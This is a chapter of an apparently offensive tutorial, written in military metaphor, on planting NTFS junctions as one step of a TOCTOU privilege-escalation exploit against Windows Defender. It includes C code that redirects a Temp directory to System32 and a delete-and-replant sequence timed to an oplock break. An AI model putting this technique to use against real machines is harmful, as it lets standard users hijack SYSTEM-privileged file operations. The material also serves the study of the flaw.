# Chapter 7 — NTFS Junctions: The Road Sign Swap

## What Is a Junction?

A junction is a swapped road sign. It sits at a crossroads and silently
redirects any convoy that passes through to a completely different
destination. When any program opens a path through a junction, Windows
follows the redirected route without question. The convoy commander
has no idea the signs have been changed.

```
Normal directory:
  C:\Temp\work\     →  contains files directly

Junction (swapped sign):
  C:\Temp\work\     →  redirects to C:\Windows\System32\
  
  When you open C:\Temp\work\cmd.exe
  you actually get  C:\Windows\System32\cmd.exe
```

Junctions are a feature of NTFS. They've been part of the road network
since Windows 2000. They're used legitimately across the theatre —
`C:\Documents and Settings` is a junction to `C:\Users`, for example.
Standard road infrastructure.

## Why Junctions Are Dangerous

Three properties make junctions perfect for redirecting enemy convoys
into our ambush:

### 1. The Convoy Commander Trusts the Signs
No application can tell it's following a swapped sign unless it
specifically checks for reparse points (almost none do). `CreateFile`,
`dir`, `copy`, `del` — they all follow the signs without question.
The convoy rolls through the intersection trusting the road markings
completely.

### 2. Any Private Can Swap the Signs
You don't need officer clearance. Any standard user can plant a junction
on a directory they have write access to. `C:\Temp\` is writable by
all users. A private with a screwdriver and five seconds at the
intersection.

### 3. Cross-Privilege — Redirecting the Heavy Armour
A standard user creates a junction pointing to `C:\Windows\System32`.
When a SYSTEM-level process (like Defender) follows the junction, it
accesses System32 with SYSTEM privileges. The swapped sign doesn't carry
any clearance of its own — but the SYSTEM convoy rolling through it has
clearance to enter every fortified position on the map. By redirecting
that convoy, we get their firepower pointed at their own position.
Their armour, their clearance, our targeting.

This is the core of the TOCTOU exploit: we redirect Defender's
SYSTEM-privileged fire missions to a position of our choosing.

## How Junctions Work Internally

A junction is an NTFS **reparse point** — a special marker stored on
the directory's MFT (Master File Table) entry. It's the sign planted
at the crossroads, embedded in the road infrastructure itself.

When NTFS resolves a path and encounters a directory with a reparse
point of type `IO_REPARSE_TAG_MOUNT_POINT`:

1. NTFS halts the patrol at the intersection
2. Reads the reparse data (the swapped sign — contains the new destination)
3. Re-routes the patrol from the junction target
4. Continues with whatever remains of the original path

```
Resolving: C:\Temp\work\bait.exe

Step 1: C:\              → root road, normal
Step 2: C:\Temp\         → normal intersection
Step 3: C:\Temp\work\    → SWAPPED SIGN detected!
         Reparse tag:    IO_REPARSE_TAG_MOUNT_POINT
         Target:         \??\C:\Windows\System32

Step 4: Convoy re-routed: C:\Windows\System32\
Step 5: Append remainder:  bait.exe
Step 6: Final destination: C:\Windows\System32\bait.exe
```

The convoy commander requested `C:\Temp\work\bait.exe`. The convoy
arrived at `C:\Windows\System32\bait.exe`. Nobody noticed. The signs
looked right.

## The Reparse Data Buffer

To plant the sign, you fill a data structure and send it to the
NTFS driver via `DeviceIoControl`. The munition specification:

```c
typedef struct {
    ULONG  ReparseTag;           // 0xA0000003 = IO_REPARSE_TAG_MOUNT_POINT
    USHORT ReparseDataLength;    // Size of data after this header
    USHORT Reserved;             // Must be 0
    USHORT SubstituteNameOffset; // Where the target path starts
    USHORT SubstituteNameLength; // Length of target path (bytes)
    USHORT PrintNameOffset;      // Where the display name starts
    USHORT PrintNameLength;      // Length of display name (0 = no name)
    WCHAR  PathBuffer[1];        // Variable-length: target path goes here
} REPARSE_MOUNT_POINT_BUFFER;
```

The `SubstituteName` is the actual redirect destination — where the road
really leads now — in NT namespace format:
`\??\C:\Windows\System32`

The `PrintName` is optional — it's what Explorer shows when you inspect
the sign's properties. We leave it empty. No fingerprints.

### The NT Namespace Path

Junctions store paths in NT object manager format, not DOS format:

| DOS Path | NT Path |
|----------|---------|
| `C:\Windows\System32` | `\??\C:\Windows\System32` |
| `D:\Projects` | `\??\D:\Projects` |

The `\??\` prefix tells the kernel to resolve the drive letter through
the DOS device namespace. Without it, the sign points nowhere.

In C code, you escape the backslashes:
```c
wsprintfW(ntTarget, L"\\??\\%s", targetDir);
// Produces: \??\C:\Windows\System32
```

## Planting the Sign — Creating a Junction Step by Step

```c
// 1. The intersection must EXIST and be CLEARED
CreateDirectoryW(L"C:\\Temp\\work", NULL);

// 2. Open the directory for writing reparse data
HANDLE hDir = CreateFileW(
    L"C:\\Temp\\work",
    GENERIC_WRITE,                    // Need write to set reparse
    0,                                // Exclusive access
    NULL,
    OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS        // Required for directories
    | FILE_FLAG_OPEN_REPARSE_POINT,   // Don't follow existing junction
    NULL
);

// 3. Build the reparse buffer with NT path
//    Target: \??\C:\Windows\System32
WCHAR ntTarget[] = L"\\??\\C:\\Windows\\System32";
USHORT targetBytes = (USHORT)(wcslen(ntTarget) * sizeof(WCHAR));

// 4. Allocate and fill the buffer
//    (see BB1 for complete buffer setup code)

// 5. Plant it
DeviceIoControl(
    hDir,
    FSCTL_SET_REPARSE_POINT,    // "Plant the sign at this intersection"
    reparseBuffer,
    totalSize,
    NULL, 0, &returned, NULL
);

// 6. Close the handle — sign is now active, convoy inbound
CloseHandle(hDir);
```

`FSCTL_SET_REPARSE_POINT` — that's the moment the sign goes in the ground.
The intersection now routes traffic wherever we want it to.

## Pulling the Sign Back Up — Removing a Junction

`RemoveDirectoryW` on a junction removes the SIGN, not the destination.
This is safe — you won't delete System32. Pull the sign, the intersection
goes back to normal. The destination it was pointing to — enemy territory,
our ambush position, wherever — is completely unaffected.

```c
RemoveDirectoryW(L"C:\\Temp\\work");
// Removes the junction sign. C:\Windows\System32 is untouched.
```

You can also remove just the reparse point (keeping the directory)
using `FSCTL_DELETE_REPARSE_POINT`, but we don't need that level of
finesse. Rip the sign out, move on.

## Junctions vs Symlinks — Who Needs Officer Clearance

| Feature | Junction | Symlink |
|---------|----------|---------|
| Works on | Directories only | Files AND directories |
| Needs admin? | **No** | Yes (unless dev mode) |
| Resolves where? | Server side (kernel) | Client side (can be remote) |
| Target must exist? | At access time | No (can be dangling) |
| Relative paths? | No (absolute only) | Yes |
| For exploit? | **YES** | No (needs admin) |

This is the critical distinction. Junctions don't need officer clearance —
any private can swap the signs, no admin privileges required. Symlinks
need admin (or developer mode enabled), which defeats the purpose of a
privilege escalation assault. You don't need officer paperwork for
junctions. That's why they're our weapon.

## The Junction Requirement: Cleared Intersection

A junction can only be planted on an **empty directory**. If the
intersection has vehicles parked in it, `FSCTL_SET_REPARSE_POINT` fails.
You can only swap signs at a cleared crossroads — not one clogged with
traffic.

In the ambush sequence:
1. We have `C:\Temp\work\bait.exe` (intersection occupied)
2. Claymore fires — CONTACT — we need to swap the sign NOW
3. Delete `bait.exe` → intersection is cleared
4. Plant the junction sign
5. Defender's convoy follows the sign into our ambush

The clear-and-rebuild is faster than sweeping out debris:
```c
DeleteFileW(L"C:\\Temp\\work\\bait.exe");
RemoveDirectoryW(L"C:\\Temp\\work");
CreateDirectoryW(L"C:\\Temp\\work", NULL);
// Now plant the sign on the cleared intersection
```

Clear the intersection, plant the sign, let the convoy roll. Three steps,
sub-millisecond. By the time Defender's convoy reaches the crossroads,
the sign is already pointing into hostile territory.

## Security Implications

Why doesn't Windows prevent standard users from planting junction signs
to fortified directories?

Because junctions themselves aren't the vulnerability. A road sign is
just a road sign. The vulnerability is in a convoy commander (Defender)
who:
1. Reads the sign and plots the route
2. Drives the route later
3. Without checking the signs again

If Defender re-read the signs after the claymore fired — if it
re-validated the path after the oplock break — junctions would be
harmless. The convoy would see the swapped sign and halt. But Defender
trusts the original reconnaissance. It committed to the route and never
looked at the signs again. The bug is in Defender's fire discipline,
not in the road infrastructure.

Microsoft has hardened some of these routes over the years. Windows 10+
has some mitigations against junction attacks in certain sectors. But
Defender's scan pipeline still has the gap. That's the unguarded
intersection we exploit.

## Key Takeaways

- Junctions redirect convoys at the crossroads — completely transparent to the convoy commander
- Any private can plant them (no officer clearance / no admin needed)
- They use NT namespace paths (`\??\C:\...`)
- Planted via `FSCTL_SET_REPARSE_POINT` through `DeviceIoControl`
- Must be on a cleared intersection (empty directory)
- `RemoveDirectoryW` pulls the sign back up — the destination is untouched
- Junctions need no clearance; symlinks need admin — junctions are our weapon
- The vulnerability is in Defender's failure to re-read the signs, not in NTFS

## Test Program

Compile and run `TESTS/test07_junction.c` to plant a sign at a crossroads,
verify the convoy gets redirected, then pull the sign back up.
